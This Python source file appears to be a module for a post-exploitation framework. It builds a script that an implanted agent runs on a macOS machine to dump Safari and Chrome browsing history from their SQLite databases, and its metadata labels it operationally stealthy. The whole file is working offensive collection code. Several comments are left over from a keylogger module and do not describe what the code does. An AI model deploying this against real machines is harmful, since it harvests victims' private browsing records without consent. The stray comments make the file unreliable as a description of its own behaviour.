class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Browser Dump',

            # list of one or more authors for the module
            'Author': ['@424f424f'],

            # more verbose multi-line description of the module
            'Description': ("This module will dump browser history from Safari and Chrome."),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': "",

            # if the module needs administrative privileges
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': True,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': [
                "https://gist.github.com/dropmeaword/9372cbeb29e8390521c2"
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to keylog.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Number': {
                'Description'   :   'Number of URLs to return.',
                'Required'      :   True,
                'Value'         :   '3'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        number = self.options['Number']['Value']

        # base64'ed launcher of ./data/misc/keylogger.rb from MSF
        script = """
import sqlite3
import os

number = ''
class browser_dump():
    def __init__(self):
        try:
            print "[*] Dump Started!"
        except Exception as e:
            print e

    def func(self, number):
        print "Dumping safari..."
        print ""
        try:

            from os.path import expanduser
            home = expanduser("~") + '/Library/Safari/History.db'
            if os.path.isfile(home):

                conn = sqlite3.connect(home)
                cur = conn.cursor()
                cur.execute("SELECT datetime(hv.visit_time + 978307200, 'unixepoch', 'localtime') as last_visited, hi.url, hv.title FROM history_visits hv, history_items hi WHERE hv.history_item = hi.id;")
                statment = cur.fetchall()
                number = %s * -1
                for item in statment[number:]:
                    print item
                    
                conn.close()
        except Exception as e:
            print e
        print ""
        print "Dumping Chrome..."
        print ""
        try:

            from os.path import expanduser
            home = expanduser("~") + '/Library/Application Support/Google/Chrome/Default/History'
            if os.path.isfile(home):
                conn = sqlite3.connect(home)
                cur = conn.cursor()
                cur.execute("SELECT datetime(last_visit_time/1000000-11644473600, \\"unixepoch\\") as last_visited, url, title, visit_count FROM urls;")
                statment = cur.fetchall()
                number = %s * -1
                for item in statment[number:]:
                    print item

                conn.close()
        except Exception as e:
            print "error"
            print e


s = browser_dump()
s.func(number)
""" % (number, number)

        return script
